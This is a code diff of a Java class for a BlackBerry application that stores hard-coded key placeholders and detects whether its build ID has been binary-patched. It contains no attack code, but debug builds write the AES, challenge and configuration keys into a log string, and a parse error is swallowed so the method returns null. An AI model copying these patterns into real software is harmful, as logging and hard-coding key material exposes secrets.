@@ -1,20 +1,24 @@
 package blackberry.config;
 
+import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.text.HexadecimalTextFilter;
 
 public class InstanceKeys {
+
     private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
     private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52";
     private static String instanceID = "bg5etG87q20Kg52W5Fg1";
     private static String buildID = "av3pVck1gb4eR2";
     private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
-    //private static String confName = "c3mdX053du1YJ541vqWILrc4Ff71pViL";
 
     private static byte[] byteAesKey;
     private static byte[] byteChallengeKey;
     private static byte[] byteConfKey;
-    //private static byte[] byteConfNameKey;
     private static byte[] byteInstanceID;
+
+   
+    public InstanceKeys() {
+    }
 
     //#ifdef DEBUG
     public static String log = "";
@@ -26,19 +30,14 @@ public class InstanceKeys {
      * 
      * @return true, if successful
      */
-    public static boolean hasBeenBinaryPatched() {
+    public boolean hasBeenBinaryPatched() {
         boolean ret = !buildID.startsWith("av3pVck1gb4eR");
         //#ifdef DEBUG
-        log += "buildID: " + buildID;
+        log += " buildID: " + buildID;
         //#endif
         return ret;
     }
-
-    public InstanceKeys(byte[] byteInstanceID, String instanceID) {
-        this.byteInstanceID = byteInstanceID;
-        this.instanceID = instanceID;
-    }
-
+    
     /**
      * Gets the aes key.
      * 
@@ -48,7 +47,7 @@ public class InstanceKeys {
         if (byteAesKey == null) {
             byteAesKey = keyFromString(aes);
             //#ifdef DEBUG
-            log += "aes: " + aes;
+            log += " aes: " + aes;
             //#endif
         }
         return byteAesKey;
@@ -72,7 +71,7 @@ public class InstanceKeys {
         if (byteChallengeKey == null) {
             byteChallengeKey = keyFromString(challenge);
             //#ifdef DEBUG
-            log += "challenge: " + challenge;
+            log += " challenge: " + challenge;
             //#endif
         }
 
@@ -88,7 +87,7 @@ public class InstanceKeys {
         if (byteConfKey == null) {
             byteConfKey = keyFromString(conf);
             //#ifdef DEBUG
-            log += "conf: " + conf;
+            log += " conf: " + conf;
             //#endif
         }
 
@@ -107,24 +106,32 @@ public class InstanceKeys {
 
     private byte[] keyFromString(final String string) {
 
-        int len = 16;
-        byte[] array = new byte[len];
-        //#ifdef DEBUG
-        log += string + " : ";
-        //#endif
-
-        for (int pos = 0; pos < len; pos++) {
-            String repr = string.substring(pos * 2, pos * 2 + 2);
-            array[pos] = (byte) Integer.parseInt(repr, 16);
+        try {
+            int len = 16;
+            byte[] array = new byte[len];
             //#ifdef DEBUG
-            log += "" + pos + ":" + repr + " ";
+            log += string + " : ";
             //#endif
-        }
 
-        //#ifdef DEBUG
-        log += " | ";
-        //#endif
-        return array;
+            for (int pos = 0; pos < len; pos++) {
+                String repr = string.substring(pos * 2, pos * 2 + 2);
+                array[pos] = (byte) Integer.parseInt(repr, 16);
+                //#ifdef DEBUG
+                log += "" + pos + ":" + repr + " ";
+                //#endif
+            }
+
+            //#ifdef DEBUG
+            log += " | ";
+            //#endif
+            return array;
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            log += " Ex: " + ex;
+            log += " binary pathced: " + hasBeenBinaryPatched();
+            //#endif
+            return null;
+        }
     }
 
     /**
